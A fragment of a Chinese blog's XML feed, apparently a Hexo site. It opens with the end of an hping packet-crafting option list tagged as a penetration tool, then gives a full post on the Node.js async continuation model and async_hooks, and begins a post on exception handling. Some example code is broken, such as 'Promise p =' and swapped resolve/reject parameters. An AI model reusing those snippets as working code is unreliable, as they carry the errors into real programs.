<span class="attr">--icmptype</span> <span class="number">17</span> (to send ICMP <span class="selector-tag">address</span> <span class="attribute">mask</span> requests)</span><br><span class="line">-s <span class="attr">--baseport</span> source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加<span class="number">1</span>，这规则你可以自己定义。</span><br><span class="line">-<span class="selector-tag">p</span> <span class="attr">--deskport</span> <span class="selector-attr">[+]</span><span class="selector-attr">[+]</span>desk port 设置目标端口，缺省为<span class="number">0</span>，一个加号设置为:每发送一个请求包到达后，端口加<span class="number">1</span>，两个加号为：每发一个包，端口数加<span class="number">1</span>。</span><br><span class="line"><span class="attr">--keep</span> 上面说过了。</span><br><span class="line">-w <span class="attr">--win</span> 发的大小和windows一样大，<span class="number">64</span>BYTE。</span><br><span class="line">-O <span class="attr">--tcpoff</span> Set fake tcp data offset. Normal data offset is tcphdrlen / <span class="number">4</span>.</span><br><span class="line">-m <span class="attr">--tcpseq</span> 设置TCP序列数。</span><br><span class="line">-l <span class="attr">--tcpck</span> 设置TCP ack。</span><br><span class="line">-Q <span class="attr">--seqnum</span> 搜集序列号的，这对于你分析TCP序列号有很大作用。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">实用的渗透工具</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="渗透" scheme="https://www.scery.com/categories/Linux/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="渗透" scheme="https://www.scery.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs异步延续模型</title>
    <link href="https://www.scery.com/Node-js%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B.htm"/>
    <id>https://www.scery.com/Node-js%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B.htm</id>
    <published>2020-09-25T00:16:25.000Z</published>
    <updated>2024-03-18T02:51:00.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Node-js异步延续模型"><a href="#Node-js异步延续模型" class="headerlink" title="Node.js异步延续模型"></a>Node.js异步延续模型</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="attr">node</span>:<span class="number">12345</span>] <span class="title class_">Uncaught</span> <span class="title class_">Exception</span>: <span class="title class_">Error</span>: read <span class="variable constant_">ECONNRESET</span></span><br><span class="line">   at <span class="title class_">TLSWrap</span>.<span class="property">onStreamRead</span> (internal/stream_base_commons.<span class="property">js</span>:<span class="number">111</span>:<span class="number">27</span>)</span><br><span class="line">   <span class="comment">// 真的没了</span></span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/641.png" alt="641"></p><h2 id="异步延续模型"><a href="#异步延续模型" class="headerlink" title="异步延续模型"></a>异步延续模型</h2><p>Node.js 使用的 JavaScript 单线程执行模型简化了非常多的问题。而为了防止 IO 阻塞 JavaScript 执行线程，IO 操作在关联了 JavaScript 回调函数后就被放入了后台处理。当 IO 操作完成后，与其关联的 JavaScript 回调会被放入事件队列等待在 JavaScript 线程调用，可以在这里[链接1]了解更多 Node.js 事件循环的详情。</p><p>这个模型有很多好处，但是也有一个关键的挑战：异步资源与操作的上下文管理。什么是异步操作上下文？异步操作的上下文就是给定一个异步操作，我们能够通过异步上下文知道这个异步操作是因为什么触发执行的，接下来可以触发其他什么异步操作。Semantics of Asynchronous JavaScript [链接2] 通过非常精确的描述方法描述了异步资源的“上下文”，但是我们只想回答一个问题，在程序的任意一个执行时间点，“我们是通过什么样的异步函数执行路径执行到现在这个代码位置的”？</p><p>为了回答这个问题，我们先明确几个关键点：</p><ul><li>执行桢 (Execution Frame) - 执行桢是程序中后继函数的一次执行过程。可以把执行桢当作从一个特定的函数执行桢被推入执行栈开始，直到这个执行桢执行结束被弹出调用栈，这样一段时间片段。不是所有的函数都是后继函数 (Continuation)，一个特定的后继函数可以被调用多次，每一次执行都对应一个独立的执行桢。</li><li>后继函数 (Continuation) - 后继函数是在执行桢中创建的 JavaScript 函数，并且会在后续被作为异步回调执行。当被调用时，后继函数会创建一个独立的执行桢。比如当我们调用 <code>setTimeout(function c() &#123;&#125;, 1000)</code>，<code>setTimeout</code> 是在一个执行桢里被调用的，并且以一个后继函数 <code>c</code> 作为参数。当 <code>c</code> 在计时到时后被执行时，会创建一个新的执行桢；当 <code>c</code> 执行结束时，即意味着这个新创建的执行桢执行结束。</li><li>后继点 (Continuration Point) - 后继点是接受一个后继函数作为参数的函数。通常在 JavaScript 中后继点都是宿主环境定义的（ECMAScript 规范中中不存在与 IO 相关的操作的定义）。比如 <code>setTimeout</code>，也包括 <code>Promise.then</code>。值得注意的是，不是所有接收函数作为参数的函数都是后继点，作为后继点，这些函数参数需要被异步调用，即不在当前执行桢被调用执行。比如 <code>Array.prototype.forEach</code> 就不算后继点。</li><li>链接点 (Link Point) - 程序运行中，当一个后继点被调用时，我们称为链接点。这个时候需要在当前执行桢与被作为参数传入的后继函数之间创建一个逻辑连接，作为上下文绑定。</li><li>就绪点 (Ready Point) - 就绪点是程序运行中之前链接过的后继函数被标记为“准备就绪”，准备被执行。这个过程会在后继函数与当前执行桢之间建立逻辑连接，这个逻辑连接可以称为因果关系。通常就绪点都需要在链接点后才能产生，但是 Promise 在这里的处理不太一样，promise 可以在他的 Promise 链中的前置的 promise 被 resolve 时产生一个就绪点，而此时不一定需要已经生成链接点（绑定回调函数），如 <code>new Promise(res =&gt; res())</code> 立刻创建了一个已经 resolve 的 Promise，此时已经触发了就绪点，但是我们还未通过 <code>.then</code> 链接上下一个 Promise。</li></ul><p>而上述几个关键点可以总结为以下几个事件：</p><ul><li>执行开始 (<code>executionBegin</code>): 表示一个执行桢开始执行；</li><li>链接 (<code>link</code>): 表示一个后继点被调用，一个后继函数被放入等待队列等待就绪；</li><li>就绪 (<code>ready</code>): 表示一个就绪点被触发；</li><li>执行结束 (<code>executionEnd</code>): 表示一个执行桢执行完毕。</li></ul><p>这里我们以下面这段代码举个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;starting&#x27;</span>);</span><br><span class="line"><span class="title class_">Promise</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">reject, resolve</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;resolving promise&#x27;</span>);</span><br><span class="line">   <span class="title function_">resolve</span>();</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;in then&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码可以通过以下的事件流描述整个异步执行过程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span> &#125; <span class="comment">// 程序开始执行</span></span><br><span class="line"><span class="comment">// starting</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;link&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">1</span>&#125; <span class="comment">// `f1()` 已经被链接到了 &quot;setTimeout()&quot; 的调用上</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;link&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">2</span>&#125; <span class="comment">// `f2()` 已经被链接到了 &quot;p.then()&quot; 的调用上</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span> &#125; <span class="comment">// 程序外层代码执行完毕</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">1</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">3</span> &#125; <span class="comment">// 100ms 计时到时，执行就绪</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">3</span> &#125; <span class="comment">// f1() 回调开始执行</span></span><br><span class="line"><span class="comment">// resolving promise</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">2</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">5</span> &#125; <span class="comment">// promise p 被 resolve，标记了 &quot;then(function f2()...&quot; 就绪</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span> &#125; <span class="comment">// f1() 回调执行完毕</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">6</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">5</span> &#125; <span class="comment">// f2() 回调开始执行</span></span><br><span class="line"><span class="comment">// in then</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">6</span> &#125; <span class="comment">// f2() 回调执行完毕</span></span><br></pre></td></tr></table></figure><p>现有技术</p><h3 id="async-hooks"><a href="#async-hooks" class="headerlink" title="async_hooks"></a><code>async_hooks</code></h3><p><code>async_hooks</code> 即是 Node.js 对上述模型的实现。其中 <code>async_hooks</code> API 提供了几个异步阶段的钩子回调可以注册：</p><ul><li><code>[init(asyncId, type, triggerAsyncId, resource): void](https://nodejs.org/api/async_hooks.html#async_hooks_init_asyncid_type_triggerasyncid_resource)</code> - 表示 asyncId 对应的异步资源（可以理解为上文中的异步上下文）初始化完成，后续这个资源可以触发异步回调（不绝对会触发，比如一个 HTTP Server 启动后没人来请求）；</li><li><code>[before(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_before_asyncid)</code> - 表示准备开始执行异步回调函数，而在这个异步回调函数的执行桢中，生成的任意异步资源（相当于上文中的后继函数）都会与 asyncId 参数对应的异步资源链接，作为触发原因；</li><li><code>[after(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_after_asyncid)</code> - 表示异步回调函数执行完毕，停止将asyncId 参数关联的异步资源与当前执行桢新创建的异步资源链接；</li><li><code>[destroy(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_destroy_asyncid)</code> - 表示 asyncId 参数对应的 异步资源被回收，后续不可能再通过这个异步资源触发回调。</li></ul><h3 id="与-domain-的区别"><a href="#与-domain-的区别" class="headerlink" title="与 domain 的区别"></a>与 <code>domain</code> 的区别</h3><p>部分了解、使用过 <code>domain</code> 模块的同学可能会有一个疑问，<code>async_hooks</code> API 与被废弃的 <code>domain</code> 有什么区别？</p><p><code>async_hooks</code> 作为上述异步模型中将各个异步资源链接起来的黏合剂，其本身并不提供任何错误处理相关的 API，他的 API 语义也非常清晰，只是对于异步资源的执行事件的描述。而 <code>domain</code> 的主要用途是异步错误的处理，但是因为在 <code>domain</code> 提出的时候还不存在 <code>async_hooks</code>，并且对于异步资源、异步执行的语义定义并不清晰，从而导致实际生产中 <code>domain</code> 的使用非常容易导致错误并且难以排查（多个 <code>domain</code> 的使用方其中如果使用了不是那么正确的方法，会将 <code>domain</code> 的状态搅得一团糟）。</p><p>而在 <code>async_hooks</code> 实现了明确的异步资源与执行的语义后，<code>domain</code> 的实现也进行了迁移、使用 <code>async_hooks</code> 来实现对于异步资源回调的追踪（实现详情可以了解 PR[链接3]）。</p><h3 id="Node-js-Add-on-的兼容性"><a href="#Node-js-Add-on-的兼容性" class="headerlink" title="Node.js Add-on 的兼容性"></a>Node.js Add-on 的兼容性</h3><p>虽然 Node.js 提供的 IO 操作的异步回调都已经被妥善地封装了异步调用的上下文切换，但是 Node.js 还提供了 C/C++ Add-on 的 API，这些 Add-on 普通的 <code>napi_call_function</code> 调用并不会被当成是一个新的执行桢，就如同一个 JavaScript 函数中调用另一个 JavaScript 函数。但是如果 Add-on 在异步回调中也简单地使用 <code>napi_call_function</code> 就有可能导致 async_hooks 所提供的异步资源 API 出现漏洞。所以 Add-on 需要按照 async_hooks 提供的钩子的语义，在各个关键时间点通过异步资源 API 注册上，即可完善整个异步调用链路。但是这样会给 Add-on 开发过程造成了一定的负担，而为了降低 Add-on 开发过程出现纰漏的可能。N-API 提供了线程安全的回调 JavaScript 线程的 <code>napi_threadsafe_function</code> 机制，并且已经与异步资源绑定，不需要我们再关心异步资源的事件管理。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#include &lt;assert.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;node_api.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">async_call_js</span>(<span class="params">napi_env env,</span></span><br><span class="line"><span class="params">                  napi_value js_callback,</span></span><br><span class="line"><span class="params">                  <span class="keyword">void</span>* context,</span></span><br><span class="line"><span class="params">                  <span class="keyword">void</span>* data</span>)</span><br><span class="line">&#123;</span><br><span class="line"> napi_status status;</span><br><span class="line"> <span class="comment">// 将 data 转换成 JavaScript 值</span></span><br><span class="line"> napi_value value = <span class="title function_">transform</span>(env, data);</span><br><span class="line"> napi_value recv;</span><br><span class="line"> status = <span class="title function_">napi_get_null</span>(env, &amp;recv);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"> <span class="comment">// N-API 已经为我们绑定了异步资源，这里可以安全地使用 `napi_call_function`</span></span><br><span class="line"> napi_value ret;</span><br><span class="line"> status = <span class="title function_">napi_call_function</span>(env, recv, js_callback, <span class="number">1</span>, &amp;value, &amp;ret);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会在工作线程被调用的工作函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">do_work</span>(<span class="params">napi_threadsafe_function tsfn</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/** work, work. */</span></span><br><span class="line"> napi_status status = <span class="title function_">napi_call_threadsafe_function</span>(tsfn, data, napi_tsfn_nonblocking);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">napi_value <span class="title function_">some_module_method</span>(<span class="params">napi_env env, napi_callback_info info</span>)</span><br><span class="line">&#123;</span><br><span class="line"> napi_status status;</span><br><span class="line"> <span class="comment">// 创建与 AsyncResource 绑定的 ThreadSafe Function</span></span><br><span class="line"> napi_threadsafe_function tsfn;</span><br><span class="line"> status = <span class="title function_">napi_create_threadsafe_function</span>(env,</span><br><span class="line">                                          func,</span><br><span class="line">                                          async_resource,</span><br><span class="line">                                          async_resource_name,</span><br><span class="line">                                          max_queue_size,</span><br><span class="line">                                          initial_thread_count,</span><br><span class="line">                                          finalize_data,</span><br><span class="line">                                          finalize_cb,</span><br><span class="line">                                          context,</span><br><span class="line">                                          call_js_cb,</span><br><span class="line">                                          &amp;tsfn);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 创建工作线程</span></span><br><span class="line"> <span class="title function_">create_worker</span>(tsfn, <span class="comment">/** 其他参数 */</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回 JavaScript 值..</span></span><br><span class="line"> napi_value ret;</span><br><span class="line"> status = <span class="title function_">napi_get_null</span>(env, &amp;ret);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="异步任务调度"><a href="#异步任务调度" class="headerlink" title="异步任务调度"></a>异步任务调度</h3><p>在单元测试中，如果我们使用了异步任务，一个可能比较常见的场景就是这个异步任务可能会泄漏出我们的测试函数执行桢导致我们后续无法追踪、或者影响了后续的测试结果。</p><p>我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;should wait for async test&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">0</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">// only after this code executes will the test complete.</span></span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;wait for me&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，我们可以看到其中 setTimeout 逃逸出了测试执行桢，从而导致测试提早结束，并且可能影响后续测试任务的运行（比如在 setTimeout 中抛出了异常）。现在我们可以通过将全部的方法都使用 callback、promise 给串起来，但是这毕竟需要开发者自行去完成，并且可能出现疏漏，还是会出现例子中的情况。那么我们有没有可能从语言运行时层面提供一个“完美”的方案来跟踪所有的异步任务呢？通过 <code>async_hooks</code> 的异步资源追踪能力，我们就可以标记所有在测试执行过程中创建的异步资源，如果在测试执行结束后，还存在未销毁的异步资源，就可以更早地将问题暴露。</p><p>如我们有下面这个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;createHook, <span class="title class_">AsyncLocalStorage</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;async_hooks&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> als = <span class="keyword">new</span> <span class="title class_">AsyncLocalStorage</span>();</span><br><span class="line"><span class="keyword">const</span> backlog = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="title function_">createHook</span>(&#123;</span><br><span class="line"> init (asyncId, type, triggerAsyncId, resource) &#123;</span><br><span class="line">   <span class="keyword">const</span> test = als.<span class="title function_">getStore</span>();</span><br><span class="line">   <span class="keyword">if</span> (test == <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   backlog.<span class="title function_">set</span>(asyncId, &#123; type, triggerAsyncId, resource &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"> destroy (asyncId) &#123;</span><br><span class="line">   backlog.<span class="title function_">delete</span>(asyncId);</span><br><span class="line">&#125;,</span><br><span class="line"> promiseResolve (asyncId) &#123;</span><br><span class="line">   backlog.<span class="title function_">delete</span>(asyncId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;).<span class="title function_">enable</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queue = []</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">name, callback</span>) &#123;</span><br><span class="line"> queue.<span class="title function_">push</span>(&#123; name, callback &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="keyword">if</span> (queue.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">const</span> &#123; name, callback &#125; = queue.<span class="title function_">pop</span>();</span><br><span class="line"> als.<span class="title function_">run</span>(name, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">await</span> <span class="title function_">callback</span>();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">     als.<span class="title function_">exit</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">       <span class="title function_">setImmediate</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">         <span class="title function_">assert</span>(backlog.<span class="property">size</span> === <span class="number">0</span>, <span class="string">`&#x27;<span class="subst">$&#123;name&#125;</span>&#x27; ended with dangling async tasks.`</span>);</span><br><span class="line">         <span class="title function_">run</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="title function_">nextTick</span>(run);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 测试声明开始 */</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"> <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">setTimeout</span>(res, <span class="number">100</span>));</span><br><span class="line"> <span class="comment">// Pass.</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;bar&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(res, <span class="number">100</span>);</span><br><span class="line"> <span class="comment">// Assert Failed =&gt; &#x27;bar&#x27; ended with dangling async tasks.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，每一次测试开始执行前，我们都会在为测试运行注册一个异步特有数据存储，然后再开始执行测试，这样在测试中发起的所有异步资源都会被 <code>async_hooks</code> 捕捉到并被测试模块标记，直到这个异步资源被销毁（或者是 Promise Resolve）。随后在测试结束后，我们再检查当前测试是否有遗留的异步资源，即可确认我们的测试是干净无残留的。</p><h3 id="异步调用栈-性能诊断"><a href="#异步调用栈-性能诊断" class="headerlink" title="异步调用栈/性能诊断"></a>异步调用栈/性能诊断</h3><p>这也是我们开头的问题。</p><p>在越来越多大型的项目使用 Node.js 作为研发技术栈后，开发者们也会越来越关注问题的诊断便捷性。除了异常错误排查，现在我们也可以通过 Chrome DevTools 的 CPU Profiler 亦或者是生成火焰图来诊断我们的 Node.js 应用性能表现，但是这些工具现在更多的是只能查看某一个函数在单个同步执行桢中的调用链路与时间占用比例，并没有能力将一个异步链路上每一个异步操作所花费的时间与百分比描绘出来。</p><p>而在能够串联异步链路中的异步调用栈之后，后续我们也可以在开发中使用更加直观的性能剖析工具：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/640.jpg" alt="640"></p><p>或者是提供线上的请求链路追踪能力，就如同现在各种成熟 APM 提供的应用间 RPC 调用链路一样，我们同样也可以绘制出应用内一个请求到底经历了什么流程，每一步分别花费了多少时间：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/640-20200925131314743.jpg" alt="640-20200925131314743"></p><h3 id="AsyncLocalStorage"><a href="#AsyncLocalStorage" class="headerlink" title="AsyncLocalStorage"></a>AsyncLocalStorage</h3><p>使用线程作为处理单元的模型中，我们可以使用 ThreadLocal 来存储对于当前线程特有的数据信息，那么在 Node.js 的异步模型中，我们有什么办法可以方便地存储对于当前异步任务来说特有的数据信息呢？</p><p>Node.js 在 3 月 4 日发行的 v13.10.0 版本第一次发布了 <code>async_hooks.AsyncLocalStorage</code>，可以在异步回调或者 <code>Promise</code> 中获取异步调用的状态信息，比如 HTTP 服务器在处理请求的异步链路中的任意一步都可以访问对于这个请求而言专有的数据。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>除了在 Node.js 中我们需要清晰的异步执行模型的定义之外，同样提供了 JavaScript 执行环境的浏览器中在 JavaScript 项目日渐复杂之后同样也需要更能描写异步时间线的诊断能力。除此之外，其实 Node.js 的 <code>async_hooks</code> 接口本身并不容易被更多的用户所使用，他暴露了异步资源非常底层的属性，虽然这些接口能够准确描述我们的异步资源，但是想要利用好这些接口并不简单。</p>]]></content>
    
    
    <summary type="html">异步执行在 Node.js 中是非常基本的操作，但是一个 `Uncaught Exception` 的报错就可能让我们摸不着头脑，是什么地址的 TLS 访问 `ECONNRESET` 了？</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/categories/Linux/Nodejs/"/>
    
    <category term="异步延续模型" scheme="https://www.scery.com/categories/Linux/Nodejs/%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/tags/Nodejs/"/>
    
    <category term="异步延续模型" scheme="https://www.scery.com/tags/%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs异常处理方式</title>
    <link href="https://www.scery.com/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F.htm"/>
    <id>https://www.scery.com/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F.htm</id>
    <published>2020-08-23T07:36:59.000Z</published>
    <updated>2024-09-16T08:46:47.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在Node-js中常用的异常处理方式有哪些？"><a href="#在Node-js中常用的异常处理方式有哪些？" class="headerlink" title="在Node.js中常用的异常处理方式有哪些？"></a><strong>在Node.js中常用的异常处理方式有哪些？</strong></h1><h2 id="1-使用try-catch方式来处理异常"><a href="#1-使用try-catch方式来处理异常" class="headerlink" title="1.使用try catch方式来处理异常"></a>1.使用try catch方式来处理异常</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  throw <span class="keyword">new</span> Error(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;异常被捕获了，我现在还可以继续执行了&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行命令行时候，可以看到如下，也会打印后面的 console.log的信息了；如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231525919-500969949.png" alt="561794-20190325231525919-500969949"></p><p>但是使用 try catch 无法处理异步代码块内出现的异常，比如如下代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    throw <span class="keyword">new</span> Error(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;异常被捕获了，我现在还可以继续执行了&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在命令行中打印信息如下：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231600301-1445960885.png" alt="561794-20190325231600301-1445960885"></p><p>可以看到，catch里面的console.log(‘’); 代码并没有被执行。说明catch里面的代码异常并没有被捕获到。</p><h2 id="2-使用event方式来处理异常"><a href="#2-使用event方式来处理异常" class="headerlink" title="2.使用event方式来处理异常"></a>2.使用event方式来处理异常</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&#x27;events&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个事件监听对象</span></span><br><span class="line"><span class="keyword">const</span> emitter = <span class="keyword">new</span> events.<span class="title class_">EventEmitter</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听error事件</span></span><br><span class="line">emitter.<span class="title function_">addListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 处理异常信息</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">11122222</span>); <span class="comment">// 能打印 1112222 说明异常捕获到了</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span 